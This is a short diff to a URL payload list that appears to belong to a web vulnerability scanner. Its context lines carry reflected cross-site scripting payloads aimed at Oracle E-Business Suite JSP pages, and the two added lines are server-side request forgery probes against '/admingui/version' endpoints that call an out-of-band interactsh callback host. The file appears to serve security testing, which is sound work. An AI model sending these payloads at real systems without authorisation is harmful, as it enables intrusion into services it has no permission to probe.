@@ -78,3 +78,5 @@
 /OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert(
 /OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert(
 /OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert(
+/admingui/version/Version?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
+/admingui/version/Masthead.jsp?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
